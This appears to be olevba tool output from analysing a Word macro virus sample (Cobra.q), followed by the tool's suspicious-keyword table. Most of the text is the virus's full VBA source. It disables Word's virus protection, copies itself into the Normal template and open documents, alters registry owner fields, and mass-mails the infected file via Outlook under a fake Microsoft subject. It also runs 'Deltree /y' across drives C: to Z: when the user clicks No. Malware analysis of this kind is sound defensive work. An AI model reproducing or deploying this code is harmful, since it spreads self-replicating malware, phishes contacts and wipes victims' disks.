olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.q-0900212ab082b1d47dd4e62fc27a042a9a5955c6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.q-0900212ab082b1d47dd4e62fc27a042a9a5955c6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BFATEHA.bas 
in file: Virus.MSWord.Cobra.q-0900212ab082b1d47dd4e62fc27a042a9a5955c6 - OLE stream: 'Macros/VBA/BFATEHA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AFATEHA Version 1.0B
Sub PRT()
On Error Resume Next
CustomizationContext = NormalTemplate
For IOT = 1 To 3
CommandBars("Macro").Controls(IOT).OnAction = "ViewVBCode"
Next
CommandBars("View").Controls("Toolbars").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
End Sub
Sub IDN()
On Error Resume Next
Set N = NormalTemplate
Set D = ActiveDocument
NIN = False
For Each M In N.VBProject.VBComponents
If M.Name = "BFATEHA" Then NIN = True
If M.Name <> "ThisDocument" And M.Name <> "BFATEHA" Then Application.OrganizerDelete Source:=N.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If NIN = False Then Application.OrganizerCopy Source:=D.FullName, Destination:=N.FullName, Name:="BFATEHA", Object:=wdOrganizerObjectProjectItems
For Each OD In Documents
For Each M In OD.VBProject.VBComponents
DIN = False
If M.Name = "BFATEHA" Then DIN = True
If M.Name <> "BFATEHA" And M.Name <> "Reference to Normal" And M.Name <> "ThisDocument" Then Application.OrganizerDelete Source:=OD.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If DIN = False Then
Application.OrganizerCopy Source:=N.FullName, Destination:=OD.FullName, Name:="BFATEHA", Object:=wdOrganizerObjectProjectItems
OD.SaveAs OD.FullName, wdFormatDocument, False
End If
Next
End Sub
Sub ViewVBCode()
End Sub
Sub ChithiPathanoo()
On Error Resume Next
If Not IsDate(System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Insdate")) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Insdate") = Format(Date, "mm/dd/yyyy")
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Fateha N Liton" Then
ADS = "'" + String(50, "-") + Chr(13) + _
"'" + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") + Chr(13) + _
"'" + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") + Chr(13) + _
"'" + String(50, "-")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Fateha N Liton"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Shibrampur/Burichang/Comilla/BD"
ActiveDocument.VBProject.VBComponents("BFATEHA").CodeModule.InsertLines ActiveDocument.VBProject.VBComponents("BFATEHA").CodeModule.CountOfLines + 1, ADS
End If
Dim UD, DAS, AB, BO, TOT
Set UD = CreateObject("Outlook.Application")
Set DAS = UD.GetNameSpace("MAPI")
DAS.Logon "profile", "password"
For LO = 1 To DAS.AddressLists.Count
Set AB = DAS.AddressLists(y)
XAX = 1
Set BO = UD.CreateItem(0)
For IOT = 1 To AB.AddressEntries.Count
TOT = AB.AddressEntries(XAX)
BO.Recipients.Add TOT
XAX = XAX + 1
Next IOT
BO.Subject = "Important Message From Microsoft Via " & Application.UserName
BO.Body = "Important document:-"
BO.Add ActiveDocument.FullName
BO.Send
TOT = ""
Next LO
DAS.Logoff
End Sub
Sub NostoHD()
Insd = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Insdate")
Curd = Format(Date, "mm/dd/yyyy")
Diffd = DateValue(Curd) - DateValue(Insd)
If Diffd > 30 Then
If Day(Date) = Month(Date) Then
Barta = "21She February Antorjatic Matribhasha Dibos!" + Chr(13) + "Apnar Juktitee Dhik Na Bedhik?" + Chr(13) + "Click on Yes or No"
msg = MsgBox(Barta, vbYesNo + vbQuestion, "Bangla")
If msg = vbNo Then
For IOT = 67 To 67 + 23
Shell "Deltree /y " & Chr(IOT) & ":\", vbHide
Next
End If
End If
End If
End Sub
Sub FileNew()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
WordBasic.FileExit
End Sub
Sub FileOpen()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
Dialogs(wdDialogFileOpen).Show
End Sub
Sub AutoClose()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
End Sub
Sub AutoOpen()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
End Sub
'--------------------------------------------------
'ETAC
'BAGLADESH
'--------------------------------------------------
'--------------------------------------------------
'DEFODDILS
'KALABAGAN
'--------------------------------------------------
'--------------------------------------------------
'TOMTOM
'NAGPUR, INDIA
'--------------------------------------------------
'--------------------------------------------------
'Cobra At San
'Dhaka,Bangladesh/3rd World
'--------------------------------------------------
'--------------------------------------------------
'
'
'--------------------------------------------------
'--------------------------------------------------
'
'
'--------------------------------------------------
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

